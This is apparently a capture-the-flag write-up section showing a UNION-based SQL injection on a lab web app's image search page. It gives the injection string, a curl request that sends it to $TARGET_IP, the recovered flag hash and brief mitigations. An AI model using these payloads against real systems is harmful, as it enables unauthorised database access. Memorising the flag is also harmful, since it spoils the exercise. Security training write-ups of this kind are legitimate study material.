## Exploit: SQL injection in images list
The `searchimg` page also as a similar SQL injection vulnerability to the members page, we can instantly get the flag instructions by inputting the following SQL command

```SQL
0=0 UNION SELECT url, id FROM list_images UNION SELECT url, title FROM list_images UNION SELECT url, comment FROM list_images 
```

Below is the SQL command in curl
```
curl "$TARGET_IP/?page=searchimg&id=0%3D0+UNION+SELECT+url%2C+id+FROM+list_images+UNION+SELECT+url%2C+title+FROM+list_images+UNION+SELECT+url%2C+comment
+FROM+list_images+&Submit=Submit#" | grep flag
```

Which gives us the output
![image](https://hackmd.io/_uploads/HyDahbbQxg.png)

The following is the decoding and encryption process
![image](https://hackmd.io/_uploads/B1Xla-b7ex.png)

![image](https://hackmd.io/_uploads/ryAfabWXex.png)

> The flag is `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`

### Mitigations
- Use prepared statements in SQL queries
- Avoid storing sensitive information in readable fields (comments)
